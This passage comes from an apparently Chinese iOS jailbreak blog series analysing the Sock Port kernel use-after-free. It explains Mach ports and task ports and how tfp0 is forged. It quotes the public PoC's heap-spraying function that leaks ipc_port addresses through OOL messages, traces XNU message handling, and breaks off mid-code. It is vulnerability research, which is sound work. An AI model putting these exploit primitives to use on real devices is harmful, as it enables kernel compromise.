class="built_in">close</span>(sockets[found_at]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> buf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本文介绍了一种更通用的 Heap Spraying 方案，并介绍了通过该方案实现 kread 的过程和原理。</p>
<h1 id="下节预告"><a href="#下节预告" class="headerlink" title="下节预告"></a>下节预告</h1><p>通过 IOSurface Spraying 不仅能实现 kread，也可以实现 kfree。在下一篇文章中，我们将介绍通过 kread + kfree 的组合实现 tfp0 的最后几个步骤。</p>
<p><img style="width: 320px;" src="https://user-gold-cdn.xitu.io/2019/8/24/16cc33a51b0a7319?w=1005&h=1164&f=png&s=197292"></img></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li><a href="https://developer.apple.com/documentation/iosurface" target="_blank" rel="noopener">IOSurface Framework. Apple Document</a></li>
<li><a href="https://iphonedevwiki.net/index.php/IOSurface" target="_blank" rel="noopener">IOSurface. iPhone Dev Wiki</a></li>
<li><a href="https://github.com/jakeajames/sock_port/tree/sock_port_2" target="_blank" rel="noopener">Sock Port 2. jakeajames</a></li>
</ol>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/11/24/Sock-Port-%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%EF%BC%88%E4%BA%8C%EF%BC%89%E9%80%9A%E8%BF%87-Mach-OOL-Message-%E6%B3%84%E9%9C%B2-Port-Address/">Sock Port 漏洞解析（二）通过 Mach OOL Message 泄露 Port Address</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-11-24</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/UAF/">UAF</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Sock-Port/">Sock Port</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Mach/">Mach</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Mach-Port/">Mach Port</a></span><div class="content"><h1 id="系列文章"><a href="#系列文章" class="headerlink" title="系列文章"></a>系列文章</h1><ol>
<li><a href="https://juejin.im/post/5dd10660e51d453fac0a598d" target="_blank" rel="noopener">iOS Jailbreak Principles - Sock Port 漏洞解析（一）UAF 与 Heap Spraying</a></li>
</ol>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在上一篇文章中，我们初步介绍了 UAF 原理，并提到了 iOS 10.0 - 12.2 的 Socket 代码中含有一个针对 <code>in6p_outputopts</code> 的 UAF Exploit，它是整个 Sock Port 漏洞的关键。从这篇文章开始，我们将逐行分析 <a href="https://github.com/jakeajames/sock_port/tree/sock_port_2" target="_blank" rel="noopener">Sock Port 2 的 Public PoC 源码</a>，并结合 XNU 源码进行深入分析和解释。</p>
<h1 id="Mach-port-是什么"><a href="#Mach-port-是什么" class="headerlink" title="Mach port 是什么"></a>Mach port 是什么</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>在介绍 Sock Port 之前，我们需要先引入 Mach port 的概念[1]：</p>
<blockquote>
<p>Mach ports are a kernel-provided inter-process communication (IPC) mechanism used heavily throughout the operating system. A Mach port is a unidirectional, kernel-protected channel that can have multiple send endpoints and only one receive endpoint.</p>
</blockquote>
<p>即 Mach ports 是内核提供的进程间通信机制，它被操作系统频繁的使用。一个 Mach port 是一个受内核保护的单向管道，它可以有多个发送端，但只能有一个接收端。</p>
<h2 id="Mach-port-对应的内核对象"><a href="#Mach-port-对应的内核对象" class="headerlink" title="Mach port 对应的内核对象"></a>Mach port 对应的内核对象</h2><p>Mach port 在用户态以 <code>mach_port_t</code> 句柄的形式存在，在内核空间中每个 <code>mach_port_t</code> 句柄都有相对应的内核对象 <code>ipc_port</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipc_port</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_object</span> <span class="title">ip_object</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_mqueue</span> <span class="title">ip_messages</span>;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">    	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_space</span> *<span class="title">receiver</span>;</span></span><br><span class="line">    	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_port</span> *<span class="title">destination</span>;</span></span><br><span class="line">    	<span class="keyword">ipc_port_timestamp_t</span> timestamp;</span><br><span class="line">    &#125; data;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">    	<span class="keyword">ipc_kobject_t</span> kobject; <span class="comment">// task</span></span><br><span class="line">    	<span class="keyword">ipc_importance_task_t</span> imp_task;</span><br><span class="line">    	<span class="keyword">ipc_port_t</span> sync_inheritor_port;</span><br><span class="line">    	<span class="class"><span class="keyword">struct</span> <span class="title">knote</span> *<span class="title">sync_inheritor_knote</span>;</span></span><br><span class="line">    	<span class="class"><span class="keyword">struct</span> <span class="title">turnstile</span> *<span class="title">sync_inheritor_ts</span>;</span></span><br><span class="line">    &#125; kdata;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
<p>其中比较关键的是 +0x68 处的 <code>kobject</code> 成员，它是一个 <code>task</code> 对象，根据 Apple 给出的文档：Task 是拥有资源的单位，它包含了虚拟地址空间、mach ports 空间以及线程空间[2]，它类似于进程的概念，在这里我们可以简单地理解为<strong>每个进程都有其对应的 Task，内核通过 Task 可以管理进程资源，并通过这种机制实现进程间通信</strong>。</p>
<h2 id="内核中的-Task-对象"><a href="#内核中的-Task-对象" class="headerlink" title="内核中的 Task 对象"></a>内核中的 Task 对象</h2><p>Task 在内核中的结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task</span> &#123;</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">/* Virtual address space */</span></span><br><span class="line">    <span class="keyword">vm_map_t</span>	<span class="built_in">map</span>;		<span class="comment">/* Address space description */</span></span><br><span class="line">    <span class="keyword">queue_chain_t</span>	tasks;	<span class="comment">/* global list of tasks */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">/* Threads in this task */</span></span><br><span class="line">    <span class="keyword">queue_head_t</span>		threads;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">/* Port right namespace */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_space</span> *<span class="title">itk_space</span>;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* Proc info */</span></span><br><span class="line">    <span class="keyword">void</span> *bsd_info;</span><br><span class="line">    <span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
<p>上述代码中的 <code>map</code>, <code>threads</code> 和 <code>itk_space</code> 分别对应了上述对 Task 拥有的虚拟地址空间、mach ports 命名空间以及线程空间，而 <code>bsd_info</code> 是一个 Proc 对象，它包含了当前进程信息，例如我们熟悉的 <code>PID</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span>	<span class="title">proc</span> &#123;</span></span><br><span class="line">    LIST_ENTRY(proc) p_list;    <span class="comment">/* List of all processes. */</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> * 		task;   <span class="comment">/* corresponding task (static)*/</span></span><br><span class="line">    <span class="keyword">pid_t</span>		p_ppid; <span class="comment">/* process's parent pid number */</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">pid_t</span>		p_pid;  <span class="comment">/* Process identifier. (static)*/</span></span><br><span class="line">    <span class="comment">// ...</span></span><br></pre></td></tr></table></figure>

<h2 id="Port-amp-Task-与进程的对应关系"><a href="#Port-amp-Task-与进程的对应关系" class="headerlink" title="Port &amp; Task 与进程的对应关系"></a>Port &amp; Task 与进程的对应关系</h2><p>在用户态我们可以通过 <code>mach_task_self_</code> 变量或是 <code>mach_task_self()</code> 宏函数拿到当前进程的 <code>Task port</code>，所谓 <code>Task port</code> 即是指包含了该进程对应的 <code>Task</code> 作为其 <code>kobject</code> 的任务端口，拥有该端口即可对相应的进程“为所欲为”。</p>
<p>因此，只要我们能在用户态获取到内核的 <code>Task port</code>，就能对内核为所欲为。Sock Port 本质上就是在用户态伪造了一个合法的内核 <code>Task port</code>（又被称之为 <code>task_for_pid(0)</code> ，即 <code>tfp0</code>）。</p>
<h1 id="Sock-Port-概览"><a href="#Sock-Port-概览" class="headerlink" title="Sock Port 概览"></a>Sock Port 概览</h1><p>Sock Port 漏洞通过 Socket in6p_outputopts UAF 主要实现了 3 个 Exploit Primitive：</p>
<ol>
<li><code>mach_port</code> 句柄对应的 <code>ipc_port</code> 地址泄露，通过这种方式我们可以拿到应用自身进程的 <code>Task port</code>；</li>
<li>借助于操作 <code>in6p_outputopts</code> 的成员实现了不稳定的内核内存读取；</li>
<li>借助于操作 <code>in6p_outputopts</code> 的成员实现了内核中任意大小 zone 的释放。</li>
</ol>
<p>Sock Port 通过组合这些 Primitive，先是通过 Socket UAF 获得了一个可控的内核地址空间，随后通过 Mach OOL Message 将这些空间填充成 <code>ipc_port</code> 的地址，最后偷梁换柱的用伪造的 <code>ipc_port</code> 对其进行替换，此时我们能够得到一个合法、可控的 <code>ipc_port</code>。</p>
<p>随后我们通过读取自身进程 <code>Task port</code> 的 <code>bsd_info</code> 以及 <code>task_prev</code> 枚举所有进程，直到 pid = 0 我们便拿到了 Kernel Task，从 Kernel Task 中取出 Kernel Map 赋予我们伪造的 <code>ipc_port</code>，此时我们便将伪造的 <code>ipc_port</code> 伪装成了一个真正的 <code>Kernel Task port</code>。</p>
<p>以上是对 Sock Port 的一个概述，详细的利用过程涉及到 XNU 的诸多知识，且每一步都富含细节，到这里读者只需要对该漏洞有个整体认识，在接下来的文章中会一步步分析这些 Primitive 的原理，以及组合 Primitives 实现 tfp0 的详细过程。</p>
<h1 id="获取-Port-Address-的思路"><a href="#获取-Port-Address-的思路" class="headerlink" title="获取 Port Address 的思路"></a>获取 Port Address 的思路</h1><p>漏洞的第一个关键是获取到当前进程的 Task port 地址，这也是本文重点分析的内容。常规情况下，在用户态我们只能拿到 Task port 的句柄，若要拿到地址，有两个思路：</p>
<ol>
<li>泄露当前进程的 port 索引表，并通过句柄查询 port 的实际地址；</li>
<li>通过某种方式迫使内核分配 Task port 的指针到我们可读的内核区域，即 UAF 方式。</li>
</ol>
<p>事实上当前进程的 port 索引表是被 Task port 所间接引用的，即常规情况下我们需要先知道 Task port address 才能获取到 port 索引表的位置，因此方式 1 不可行。实现方式 2 的关键点有两个：UAF &amp; 分配 Task port pointer，前者已经通过 Socket UAF 满足，现在只差后者。</p>
<h2 id="迫使内核分配-Task-port-pointer"><a href="#迫使内核分配-Task-port-pointer" class="headerlink" title="迫使内核分配 Task port pointer"></a>迫使内核分配 Task port pointer</h2><p>在 Sock Port 中有一段关键代码，用于为指定的 <code>target port</code> 句柄在内核中分配可控数量的 <code>ipc_port</code> 指针：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// from Ian Beer. make a kernel allocation with the kernel address of 'target_port', 'count' times</span></span><br><span class="line"><span class="function"><span class="keyword">mach_port_t</span> <span class="title">fill_kalloc_with_port_pointer</span><span class="params">(<span class="keyword">mach_port_t</span> target_port, <span class="keyword">int</span> count, <span class="keyword">int</span> disposition)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">mach_port_t</span> q = MACH_PORT_NULL;</span><br><span class="line">    <span class="keyword">kern_return_t</span> err;</span><br><span class="line">    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amp;q);</span><br><span class="line">    <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[-] failed to allocate port\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">mach_port_t</span>* ports = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">mach_port_t</span>) * count);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">        ports[i] = target_port;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ool_msg</span>* <span class="title">msg</span> = (<span class="title">struct</span> <span class="title">ool_msg</span>*)<span class="title">calloc</span>(1, <span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">ool_msg</span>));</span></span><br><span class="line">    </span><br><span class="line">    msg-&gt;hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, <span class="number">0</span>);</span><br><span class="line">    msg-&gt;hdr.msgh_size = (<span class="keyword">mach_msg_size_t</span>)<span class="keyword">sizeof</span>(struct ool_msg);</span><br><span class="line">    msg-&gt;hdr.msgh_remote_port = q;</span><br><span class="line">    msg-&gt;hdr.msgh_local_port = MACH_PORT_NULL;</span><br><span class="line">    msg-&gt;hdr.msgh_id = <span class="number">0x41414141</span>;</span><br><span class="line">    </span><br><span class="line">    msg-&gt;body.msgh_descriptor_count = <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    msg-&gt;ool_ports.address = ports;</span><br><span class="line">    msg-&gt;ool_ports.count = count;</span><br><span class="line">    msg-&gt;ool_ports.deallocate = <span class="number">0</span>;</span><br><span class="line">    msg-&gt;ool_ports.disposition = disposition;</span><br><span class="line">    msg-&gt;ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;</span><br><span class="line">    msg-&gt;ool_ports.copy = MACH_MSG_PHYSICAL_COPY;</span><br><span class="line">    </span><br><span class="line">    err = mach_msg(&amp;msg-&gt;hdr,</span><br><span class="line">                   MACH_SEND_MSG|MACH_MSG_OPTION_NONE,</span><br><span class="line">                   msg-&gt;hdr.msgh_size,</span><br><span class="line">                   <span class="number">0</span>,</span><br><span class="line">                   MACH_PORT_NULL,</span><br><span class="line">                   MACH_MSG_TIMEOUT_NONE,</span><br><span class="line">                   MACH_PORT_NULL);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (err != KERN_SUCCESS) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[-] failed to send message: %s\n"</span>, mach_error_string(err));</span><br><span class="line">        <span class="keyword">return</span> MACH_PORT_NULL;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> q;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这段代码所做的事情有三个：</p>
<ol>
<li>分配一个接收端口 q 用于接收 Mach OOL Message；</li>
<li>构造一个 Mach OOL Message，并用想要获取地址的 <code>target port</code> 填充；</li>
<li>向接收端口 q 发送 Mach Message，<strong>由于 Mach Message 先经过内核，会在内核中对 OOL Message 进行复制，在复制过程中句柄会被转为地址</strong>。</li>
</ol>
<p>这个地方的一个关键是 OOL Message，它是触发内核复制的关键。OOL Message 的全称是 Out-of-line Message，之所以称之为 out of line，是因为它的消息体中包含了 Out-of-line Memory，而 Out-of-line Memory 即接收者虚拟地址空间以外的内容。根据 <a href="https://www.gnu.org/software/hurd/gnumach-doc/Memory.html" target="_blank" rel="noopener">GNU Doc</a>，Out-of-line Memory 会在接受者的空间进行 copyin 操作，<strong>有意思的事情在于如果 out-of-line 的是 <code>mach_port</code> 句柄，在 copy 时会将其转换为句柄对应的 <code>ipc_port</code> 的地址</strong>。</p>
<p>到这里我们已经了解了通过 OOL Message 迫使内核分配 port address 的方法，但知其然就要知其所以然，接下来我们从 XNU 源码入手分析着这整个过程。</p>
<h1 id="从-XNU-源码分析-Mach-OOL-Message"><a href="#从-XNU-源码分析-Mach-OOL-Message" class="headerlink" title="从 XNU 源码分析 Mach OOL Message"></a>从 XNU 源码分析 Mach OOL Message</h1><p>笔者分析使用的 XNU 版本为 xnu-4903.221.2，分析时所在的 commit hash 为 a449c6a3b8014d9406c2ddbdc81795da24aa7443。</p>
<p>我们直接从发送消息的 <code>mach_msg</code> 函数入手分析，打断点可知 <code>mach_msg</code> 最终会调用到内核的 <code>mach_msg_trap</code> 函数，我们打开 XNU 源码可以看到 <code>mach_msg_trap</code> 其实是对 <code>mach_msg_overwrite_trap</code> 的简单封装：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mach_msg_return_t</span></span><br><span class="line">mach_msg_trap(</span><br><span class="line">	struct mach_msg_overwrite_trap_args *args)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">kern_return_t</span> kr;</span><br><span class="line">    args-&gt;rcv_msg = (<span class="keyword">mach_vm_address_t</span>)<span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    kr = mach_msg_overwrite_trap(args);</span><br><span class="line">    <span class="keyword">return</span> kr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来我们去看 <code>mach_msg_overwrite_trap</code> 函数，首先看到函数的开头：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mach_msg_return_t</span></span><br><span class="line">mach_msg_overwrite_trap(</span><br><span class="line">	struct mach_msg_overwrite_trap_args *args)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">mach_vm_address_t</span>	msg_addr = args-&gt;msg;</span><br><span class="line">    <span class="keyword">mach_msg_option_t</span>	option = args-&gt;option;</span><br><span class="line">    <span class="keyword">mach_msg_size_t</span>	send_size = args-&gt;send_size;</span><br><span class="line">    <span class="keyword">mach_msg_size_t</span>	rcv_size = args-&gt;rcv_size;</span><br><span class="line">    <span class="keyword">mach_port_name_t</span>	rcv_name = args-&gt;rcv_name;</span><br><span class="line">    <span class="keyword">mach_msg_timeout_t</span>	msg_timeout = args-&gt;timeout;</span><br><span class="line">    <span class="keyword">mach_msg_priority_t</span> <span class="keyword">override</span> = args-&gt;<span class="keyword">override</span>;</span><br><span class="line">    <span class="keyword">mach_vm_address_t</span>	rcv_msg_addr = args-&gt;rcv_msg;</span><br><span class="line">    __unused <span class="keyword">mach_port_seqno_t</span> temp_seqno = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">mach_msg_return_t</span>  mr = MACH_MSG_SUCCESS;</span><br><span class="line">    <span class="keyword">vm_map_t</span> <span class="built_in">map</span> = current_map();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* Only accept options allowed by the user */</span></span><br><span class="line">    option &amp;= MACH_MSG_OPTION_USER;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (option &amp; MACH_SEND_MSG) &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (option &amp; MACH_RCV_MSG) &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ...</span></span><br></pre></td></tr></table></figure>

<p>先是从 args 中解出用户态传入的参数，随后准备了后续处理所需的环境，接下来的代码是对 option 的判断，可见收发消息共用了一个函数，由于我们传入的 option 包含了 <code>MACH_SEND_MSG</code>，接下来会走到消息发送的分支逻辑：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (option &amp; MACH_SEND_MSG) &#123;</span><br><span class="line">    <span class="keyword">ipc_space_t</span> space = current_space();</span><br><span class="line">    <span class="keyword">ipc_kmsg_t</span> kmsg;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 1. create kmsg and copy header</span></span><br><span class="line">    mr = ipc_kmsg_get(msg_addr, send_size, &amp;kmsg);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (mr != MACH_MSG_SUCCESS) &#123;</span><br><span class="line">    	<span class="keyword">return</span> mr;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 2. copy body</span></span><br><span class="line">    mr = ipc_kmsg_copyin(kmsg, space, <span class="built_in">map</span>, <span class="keyword">override</span>, &amp;option);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (mr != MACH_MSG_SUCCESS) &#123;</span><br><span class="line">    	ipc_kmsg_free(kmsg);</span><br><span class="line">    	<span class="keyword">return</span> mr;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 3. send message</span></span><br><span class="line">    mr = ipc_kmsg_send(kmsg, option, msg_timeout);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (mr != MACH_MSG_SUCCESS) &#123;</span><br><span class="line">    	mr |= ipc_kmsg_copyout_pseudo(kmsg, space, <span class="built_in">map</span>, MACH_MSG_BODY_NULL);</span><br><span class="line">    	(<span class="keyword">void</span>) ipc_kmsg_put(kmsg, option, msg_addr, send_size, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    	<span class="keyword">return</span> mr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在消息发送的分支逻辑中有三个关键步骤：</p>
<ol>
<li>通过 mach message 创建一个 kmsg，kmsg 是 mach message 在内核中的数据结构；</li>
<li>将 mach message body 复制到 kmsg 中；</li>
<li>发送 kmsg。</li>
</ol>
<p>下面我们将详细讲解前两个步骤，他们是整个 Mach OOL Message Spraying 的关键：</p>
<h2 id="构造-kmsg"><a href="#构造-kmsg" class="headerlink" title="构造 kmsg"></a>构造 kmsg</h2><p>内核通过调用 <code>ipc_kmsg_get</code> 实现了 kmsg 构造，下面是 <code>ipc_kmsg_get</code> <strong>去除了 debug 信息与一些判断逻辑外</strong>的全貌：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mach_msg_return_t</span></span><br><span class="line">ipc_kmsg_get(</span><br><span class="line">    <span class="keyword">mach_vm_address_t</span>	msg_addr, <span class="comment">// user space mach_msg_addr</span></span><br><span class="line">    <span class="keyword">mach_msg_size_t</span>	<span class="built_in">size</span>, <span class="comment">// send size = mach_msg_hdr-&gt;msgh_size = sizeof(mach_msg)</span></span><br><span class="line">    <span class="keyword">ipc_kmsg_t</span>		*kmsgp) <span class="comment">// kmsg to return</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">mach_msg_size_t</span>		msg_and_trailer_size;</span><br><span class="line">    <span class="keyword">ipc_kmsg_t</span> 			kmsg;</span><br><span class="line">    <span class="keyword">mach_msg_max_trailer_t</span>	*trailer;</span><br><span class="line">    <span class="keyword">mach_msg_legacy_base_t</span>      legacy_base;</span><br><span class="line">    <span class="keyword">mach_msg_size_t</span>             len_copied;</span><br><span class="line">    legacy_base.body.msgh_descriptor_count = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 1. copy mach header &amp; body to kernel legacy_base</span></span><br><span class="line">    len_copied = <span class="keyword">sizeof</span>(<span class="keyword">mach_msg_legacy_base_t</span>);</span><br><span class="line">    <span class="keyword">if</span> (copyinmsg(msg_addr, (<span class="keyword">char</span> *)&amp;legacy_base, len_copied))</span><br><span class="line">    	<span class="keyword">return</span> MACH_SEND_INVALID_DATA;</span><br><span class="line">    </span><br><span class="line">    msg_addr += <span class="keyword">sizeof</span>(legacy_base.header);</span><br><span class="line">    <span class="comment">// arm64 fixup</span></span><br><span class="line">    <span class="built_in">size</span> += LEGACY_HEADER_SIZE_DELTA;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 2. create a kmsg</span></span><br><span class="line">    msg_and_trailer_size = <span class="built_in">size</span> + MAX_TRAILER_SIZE;</span><br><span class="line">    kmsg = ipc_kmsg_alloc(msg_and_trailer_size);</span><br><span class="line">    <span class="keyword">if</span> (kmsg == IKM_NULL)</span><br><span class="line">    	<span class="keyword">return</span> MACH_SEND_NO_BUFFER;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 2.1 init kernel mach_header</span></span><br><span class="line">    kmsg-&gt;ikm_header-&gt;msgh_size	= <span class="built_in">size</span>;</span><br><span class="line">    kmsg-&gt;ikm_header-&gt;msgh_bits = legacy_base.header.msgh_bits;</span><br><span class="line">    kmsg-&gt;ikm_header-&gt;msgh_remote_port = 